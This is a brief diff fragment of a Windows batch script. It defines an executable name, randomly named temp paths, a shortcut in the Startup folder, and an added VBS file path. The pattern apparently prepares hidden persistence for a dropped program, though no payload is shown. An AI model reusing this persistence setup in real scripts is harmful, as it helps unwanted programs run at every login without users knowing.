@@ -4,6 +4,7 @@ set "EXE=hsapps.exe"
 set "DIR=%TEMP%\awdiojawdoij"
 set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "shortcutName=aagagwwjjw.lnk"
+set "vbsFile=%TEMP%\adwduhhu2.vbs"
 
 rmdir /s /q "%DIR%" 2>nul & mkdir "%DIR%"
 
